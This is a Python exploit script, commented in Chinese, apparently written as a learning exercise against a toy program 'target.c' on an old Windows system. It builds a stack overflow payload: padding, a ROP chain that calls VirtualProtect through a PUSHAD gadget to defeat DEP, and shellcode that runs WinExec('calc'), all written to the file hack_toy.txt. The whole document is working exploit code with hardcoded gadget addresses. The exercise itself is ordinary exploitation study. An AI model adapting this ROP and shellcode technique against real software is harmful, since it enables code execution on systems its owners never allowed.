import random,struct
print("attack target.c")

shellcode1=b"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
shellcode1+=b"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
shellcode1+=b"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
shellcode1+=b"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
shellcode1+=b"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
shellcode1+=b"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"

buf= b"12345678123456781234567812345678123456781234567890ABCDEFGHIGKLMABCDEFGHHIJKLMNOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#stack_frame=shellcode1+buf[len(shellcode1):1044]
stack_frame=buf[0:1044]

print(len(stack_frame))
print(len(shellcode1))

VirtualProtect=b'\xd4\x1a\x80\x7c' #0x7c801ad4
shellcode_addr=b'\x24\xeb\x22\x00'   #ESP+20 0x0022EB10(16)+20(10)=0x0022EB24
VirtualProtect_lpaddress=b'\x24\xeb\x22\x00'   #ESP+20 0x0022EB10(16)+20(10)=0x0022EB24
VirtualProtect_dwsize=b'\x6A\x10\x10\x10'  #343 0x00000157 #74 0x000008A
VirtualProtect_flnewProtect=b'\x40\x00\x00\x00' #PAGE_EXECUTE_READWRITE 0x00000040
VirtualProtect_floldprotect=b'\x40\x00\x00\x00' #PAGE_EXECUTE_READWRITE 0x00000040

#edi rop_nop
#esi VirtualProtect
#ebp shellcode_addr
#esp lpaddress
#ebx dwsize
#edx flnewprotect
#ecx floldprotect
#eax rop_nop or addr of VirtualProtect in stack

#-----------------------[rop_nop  -> edi]-#
#这个寄存器用不到，填入 #nop#retn 指令序列(gadgets)
#恰好在0x77BF72D5地址处有这个序列
#下面就要把这个地址赋给 EDI寄存器，简单的POP命令就可以做到
#在0x77BF3B47地址处搜索到 #POP EDI#RETN 这个序列
rop=struct.pack('<L',0x77BF3B47) #POP EDI#RETN
rop+=struct.pack('<L',0x77BF72D5) #rop_nop#retn

#-----------------------[VirtualProtect (0x7c801ad4) -> esi]-#
#需要把VirtualProtect(0x7c801ad4)的地址赋给ESI，简单的用 #POP ESI#RETN
#在0x7c921D52处找到了这个序列
rop+=struct.pack('<L',0x7c921D52) #POP ESI#RETN
rop+=struct.pack('<L',0x7c801ad4) #VirtualProtect

#-----------------------[JMP ESP (0x7C874413) -> ebp]-#
#需要把shellcode的地址0x0022efA0赋给EBP，但是这个地址中有\x00
#不能使用上面用的POP赋值，会被截断
#所以我们需要精心构造一串序列来生成这个值，并赋给EBP
#因为EBP是不常用寄存器，我们能利用的gadgets很少
#我只找到了这样的几个：
# #POP EBP #RETN
# #INC EBP #RETN
# #XCHG EAX，EBP #RETN
#最后一个gadgets，我找了好久，能找到它真的很幸运
#因为只有前两个的话，发挥空间很小
#只能POP一个不包含\x00的初始值，然后不断地INC，这需要加很久很久
#但是有了#XCHG EAX，EBP #RETN，我们就可以在常用的寄存器上把值算出来，然后赋给EBP
#我先把0x801177d0赋给ECX，然后让ECX乘以二，
#这样\x80就会变成\x00，0x1177d0就会变成0x0022efA0
#最终ECX就是我们期望得到的shellcode的地址0x0022efA0
#然后把ECX和EBP的值交换
rop+=struct.pack('<L',0x77C221EE) # POP ECX # RETN
rop+=struct.pack('<L',0x801177d0) #
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77c09bb5) #mov eax, ecx #retn
rop+=struct.pack('<L',0x7c954529) #xchg eax, ebp#retn

#-----------------------[lpaddress  -> ESP]-#
#ESP的值没有管，因为我没有精确定位VirtualProtect要改变权限的范围
#包括下面的dwsize，我也给它赋了一个较大的值
#leave it

#-----------------------[dwsize (0x10101010) -> ebx]-#
#简单的POP一个较大的值就可以了，
#其实也可以通过ECX先把值算出来，然后再把ECX的值传给EBX
#下面的EDX就是这样做的
rop+=struct.pack('<L',0x77BF362C) #POP EBX#RETN
rop+=struct.pack('<L',0x10101010) #

#-----------------------[flnewprotect (0x00000040) -> edx]-#
#这面这个序列把ECX和EDX一块构造了
#我们发现0x40，十个比较小的值，
#对于这种小数值，最简单的就是从-1开始INC，不断加加就可以
#不过我找到了ADD ECX,ECX，相当于不断乘以2，这样算的更快一些
rop+=struct.pack('<L',0x77C221EE) # POP ECX # RETN ???
rop+=struct.pack('<L',0xffffffff) # ->0x40
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN 2^6 0x40
rop+=struct.pack('<L',0x7C922B50) #MOV EDX,ECX#RETN flProtect (0x40) -> EDX
#-----------------------[floldprotect (0x00000040) -> ecx]-#


#-----------------------[rop_nop () -> eax]-#
#EAX没有用到，填充#NOP #RETN
rop+=struct.pack('<L',0x77BF1D16) #POP EAX#RETN
rop+=struct.pack('<L',0x77Bf72D5) #NOP#RETN

#-----------------------[pushad]-#
#最后一步了，这个也找了好久
#没有找到# PUSHAD # RETN
#但是找到了# PUSHAD # ADD AL,0EF # RETN
rop+=struct.pack('<L',0x77C267F0) # PUSHAD # ADD AL,0EF # RETN


file=open('hack_toy.txt','wb')
file.write(stack_frame);
file.write(b"\x41\x42\x43\x44"); #EBP
file.write(rop);
file.write(shellcode1);
file.close();


